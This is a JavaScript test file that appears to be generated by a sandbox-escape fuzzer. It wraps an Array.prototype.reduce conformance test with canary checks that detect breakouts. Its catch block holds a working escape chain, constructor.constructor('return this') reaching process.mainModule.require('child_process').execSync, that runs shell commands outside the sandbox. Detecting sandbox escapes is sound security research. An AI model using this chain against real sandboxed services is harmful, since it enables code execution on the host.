try {
    var testResult = false;
    function callbackfn(accum, val, idx, obj) {
        let REPLACER = 23;
        if (idx === 3 && val === 3) {
            testResult = true;
        }
    }
    var obj = { length: 5 };
    Object.defineProperty(obj, '1', {
        get: function () {
            throw () => {
                return () => {
                };
            };
            Object.defineProperty(obj, '3', {
                get: function () {
                    return 3;
                },
                configurable: true
            });
            return 1;
        },
        configurable: true
    });
    Array.prototype.reduce.call(obj, callbackfn);
    assert(testResult, 'testResult !== true');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}